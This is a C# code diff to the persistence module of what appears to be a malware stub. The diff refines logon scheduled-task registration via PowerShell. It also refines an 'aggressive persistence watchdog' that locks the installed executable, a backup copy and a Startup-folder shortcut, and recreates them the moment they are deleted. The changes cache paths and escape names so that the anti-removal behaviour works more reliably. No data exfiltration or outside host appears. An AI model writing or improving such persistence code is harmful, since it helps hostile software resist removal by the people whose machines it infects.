@@ -174,14 +174,15 @@ internal static partial class Persistence
             if (string.IsNullOrEmpty(selfPath)) { StubLog.Error("Persistence: no process path"); return; }
 
             // Use PowerShell Register-ScheduledTask -- works for user-level tasks without admin
-            var user = Environment.UserName;
+            var user   = Environment.UserName.Replace("'", "''");
+            var domain = Environment.UserDomainName.Replace("'", "''");
             var psCmd = $@"
 $taskName = '{name}'
 $exePath = '{selfPath.Replace("'", "''")}'
 $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if ($existing) {{ exit 0 }}
 $action = New-ScheduledTaskAction -Execute $exePath
-$trigger = New-ScheduledTaskTrigger -AtLogOn -User '{Environment.UserDomainName}\{user}'
+$trigger = New-ScheduledTaskTrigger -AtLogOn -User '{domain}\{user}'
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force
 ";
@@ -209,6 +210,9 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
     private static FileStream? _lnkLock;
     private static FileStream? _backupLock;
     private static volatile bool _watchdogRunning;
+    // Cached at StartWatchdog — prevents path divergence between FSW, RestoreAll and polling
+    private static string? _cachedLnkPath;
+    private static string? _cachedStartupDir;
 
     /// <summary>
     /// Starts an aggressive persistence watchdog that:
@@ -248,14 +252,14 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
         _exeLock = LockFile(installExe);
         _backupLock = LockFile(backupExe);
 
-        // Lock the .lnk if startup persistence is enabled
+        // Lock the .lnk — resolve and cache the path once here so every code path uses the same string
         if (Config.PersistStartup)
         {
-            var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            if (string.IsNullOrEmpty(startupDir))
-                startupDir = Path.Combine(appData, @"Microsoft\Windows\Start Menu\Programs\Startup");
-            var lnkPath = Path.Combine(startupDir, $"{name}.lnk");
-            _lnkLock = LockFile(lnkPath);
+            _cachedStartupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            if (string.IsNullOrEmpty(_cachedStartupDir))
+                _cachedStartupDir = Path.Combine(appData, @"Microsoft\Windows\Start Menu\Programs\Startup");
+            _cachedLnkPath = Path.Combine(_cachedStartupDir, $"{name}.lnk");
+            _lnkLock = LockFile(_cachedLnkPath);
         }
 
         // FileSystemWatcher on install directory -- instant reaction
@@ -281,30 +285,26 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
         }
         catch (Exception ex) { StubLog.Error($"Watchdog: FSW failed: {ex.Message}"); }
 
-        // FileSystemWatcher on startup folder
-        if (Config.PersistStartup)
+        // FileSystemWatcher on startup folder — uses cached path
+        if (Config.PersistStartup && _cachedStartupDir != null)
         {
             try
             {
-                var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                if (string.IsNullOrEmpty(startupDir))
-                    startupDir = Path.Combine(appData, @"Microsoft\Windows\Start Menu\Programs\Startup");
-                if (Directory.Exists(startupDir))
+                if (Directory.Exists(_cachedStartupDir))
                 {
-                    var sw = new FileSystemWatcher(startupDir)
+                    var startupFsw = new FileSystemWatcher(_cachedStartupDir)
                     {
                         NotifyFilter = NotifyFilters.FileName,
                         Filter = $"{name}.lnk",
                         EnableRaisingEvents = true
                     };
-                    sw.Deleted += (_, _) =>
+                    startupFsw.Deleted += (_, _) =>
                     {
                         StubLog.Info("Watchdog: .lnk deleted, recreating...");
                         Thread.Sleep(500);
                         _lnkLock?.Dispose(); _lnkLock = null;
                         InstallStartup(name);
-                        var lnkPath = Path.Combine(startupDir, $"{name}.lnk");
-                        _lnkLock = LockFile(lnkPath);
+                        _lnkLock = LockFile(_cachedLnkPath!);
                     };
                 }
             }
@@ -387,11 +387,9 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
             StubLog.Info("Watchdog: startup shortcut missing, recreating...");
             _lnkLock?.Dispose(); _lnkLock = null;
             InstallStartup(name);
-            var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            if (string.IsNullOrEmpty(startupDir))
-                startupDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    @"Microsoft\Windows\Start Menu\Programs\Startup");
-            _lnkLock = LockFile(Path.Combine(startupDir, $"{name}.lnk"));
+            // Use cached path — avoids computing a different path than the one we locked at startup
+            _lnkLock = LockFile(_cachedLnkPath ?? Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{name}.lnk"));
         }
 
         if (Config.PersistTask && !IsTaskInstalled(name))
@@ -417,11 +415,17 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
     {
         try
         {
-            var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            if (string.IsNullOrEmpty(startupDir))
-                startupDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    @"Microsoft\Windows\Start Menu\Programs\Startup");
-            return File.Exists(Path.Combine(startupDir, $"{name}.lnk"));
+            // Prefer cached path (same as what the lock and FSW watch)
+            var lnkPath = _cachedLnkPath;
+            if (lnkPath == null)
+            {
+                var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                if (string.IsNullOrEmpty(startupDir))
+                    startupDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                        @"Microsoft\Windows\Start Menu\Programs\Startup");
+                lnkPath = Path.Combine(startupDir, $"{name}.lnk");
+            }
+            return File.Exists(lnkPath);
         }
         catch { return false; }
     }
